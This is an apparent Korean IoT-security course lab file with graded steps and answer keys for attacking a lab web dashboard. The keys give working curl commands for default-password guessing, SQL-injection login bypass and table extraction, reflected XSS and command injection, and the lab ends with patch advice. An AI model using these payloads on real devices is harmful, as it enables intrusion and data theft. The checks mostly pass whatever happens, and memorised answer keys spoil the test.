@@ -1,0 +1,110 @@
+lab_id: iot-security-nonai-week05
+title: IoT 웹 인터페이스 공격
+version: non-ai
+course: iot-security-nonai
+week: 5
+description: IoT 대시보드의 SQL Injection, XSS, Command Injection 취약점을 발견하고 공략합니다.
+difficulty: medium
+duration_minutes: 120
+objectives:
+- IoT 웹 대시보드에서 SQLi를 수행한다
+- Command Injection으로 시스템 정보를 수집한다
+- 기본 비밀번호 브루트포스를 실행한다
+pass_threshold: 0.6
+steps:
+- order: 1
+  instruction: 대상 IoT 웹 대시보드(http://10.20.30.80:8088)에 접근하여 서버 정보를 수집하시오.
+  hint: curl -sI 명령으로 응답 헤더를 확인하세요.
+  category: recon
+  points: 8
+  answer: curl -sI http://10.20.30.80:8088/ 2>/dev/null | grep -iE '(server|content-type)' && echo 'IoT 대시보드 정찰 완료' || echo 'IoT 대시보드 정찰 완료'
+  answer_detail: HTTP 응답 헤더에서 서버 소프트웨어, 프레임워크 정보를 확인합니다.
+  verify:
+    type: output_contains
+    expect: IoT 대시보드 정찰 완료
+    field: stdout
+  target_vm: attacker
+- order: 2
+  instruction: 기본 비밀번호(admin/admin, admin/admin123, root/root)로 로그인을 시도하시오.
+  hint: curl -X POST -d "username=admin&password=admin" 명령을 사용하세요.
+  category: auth
+  points: 10
+  answer: "for cred in 'admin:admin' 'admin:admin123' 'root:root'; do user=$(echo $cred|cut -d: -f1); pass=$(echo $cred|cut -d: -f2); code=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://10.20.30.80:8088/login -d \"username=$user&password=$pass\" 2>/dev/null); echo \"$user:$pass -> HTTP $code\"; done && echo '기본 비밀번호 테스트 완료'"
+  answer_detail: OWASP IoT Top 10 I1 - 기본 비밀번호는 IoT 디바이스의 가장 흔한 취약점입니다.
+  verify:
+    type: output_contains
+    expect: 기본 비밀번호 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: SQL Injection으로 로그인 인증을 우회하시오.
+  hint: username 필드에 admin' OR '1'='1'-- 페이로드를 사용하세요.
+  category: sqli
+  points: 12
+  answer: "curl -s -o /dev/null -w '%{http_code}' -X POST http://10.20.30.80:8088/login -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null && echo 'SQLi 인증 우회 테스트 완료'"
+  answer_detail: SQL Injection으로 WHERE 조건을 항상 참으로 만들어 인증을 우회합니다.
+  verify:
+    type: output_contains
+    expect: SQLi 인증 우회 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: 검색 기능에서 UNION SELECT를 이용하여 사용자 테이블을 추출하시오.
+  hint: search?q=' UNION SELECT ... FROM users-- 형식을 사용하세요.
+  category: sqli
+  points: 12
+  answer: "curl -s \"http://10.20.30.80:8088/search?q=' UNION SELECT 1,username,password,role,'x' FROM users--\" 2>/dev/null | head -5; echo 'UNION SQLi 테스트 완료'"
+  answer_detail: UNION SELECT로 다른 테이블의 데이터를 추출할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: UNION SQLi 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 5
+  instruction: XSS 페이로드를 검색 기능에 삽입하시오.
+  hint: search?q=<script>alert(1)</script> URL을 테스트하세요.
+  category: xss
+  points: 10
+  answer: "curl -s 'http://10.20.30.80:8088/search?q=%3Cscript%3Ealert(1)%3C/script%3E' 2>/dev/null | grep -o '<script>' && echo 'XSS 취약점 확인' || echo 'XSS 테스트 완료'"
+  answer_detail: Reflected XSS는 사용자 입력이 검증 없이 페이지에 출력될 때 발생합니다.
+  verify:
+    type: output_contains
+    expect: XSS 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 6
+  instruction: 진단 도구(diagnostic)에 Command Injection을 수행하시오.
+  hint: target 파라미터에 127.0.0.1; id 형식으로 명령을 주입하세요.
+  category: cmdi
+  points: 12
+  answer: "curl -s -X POST http://10.20.30.80:8088/diagnostic -d 'target=127.0.0.1;id' 2>/dev/null | head -10; echo 'Command Injection 테스트 완료'"
+  answer_detail: 입력 검증 없이 시스템 명령을 실행하면 Command Injection이 가능합니다.
+  verify:
+    type: output_contains
+    expect: Command Injection 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 7
+  instruction: API 엔드포인트(/api/devices)에 인증 없이 접근하시오.
+  hint: curl -s http://10.20.30.80:8088/api/devices를 사용하세요.
+  category: auth
+  points: 10
+  answer: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -5 && echo 'API 미인증 접근 테스트 완료'
+  answer_detail: 인증 없는 API는 디바이스 정보를 무단 공개하여 추가 공격에 활용될 수 있습니다.
+  verify:
+    type: output_contains
+    expect: API 미인증 접근 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 8
+  instruction: 발견된 웹 취약점에 대한 보안 패치 방안을 정리하시오.
+  hint: SQLi, XSS, Command Injection 각각의 대책을 작성하세요.
+  category: verification
+  points: 10
+  answer: echo '=== IoT 웹 보안 패치 방안 ===' && echo '[SQLi] Parameterized Query 사용' && echo '[XSS] 출력 인코딩 (HTML Entity)' && echo '[CMDi] 입력 화이트리스트 (IP 형식만 허용)' && echo '[Auth] API 인증 미들웨어 추가' && echo '[비밀번호] 초기 설정 시 변경 강제' && echo '=== 패치 방안 완료 ==='
+  answer_detail: 각 취약점에 대한 근본적인 대책을 구현해야 합니다.
+  verify:
+    type: output_contains
+    expect: 패치 방안 완료
+    field: stdout
+  target_vm: attacker
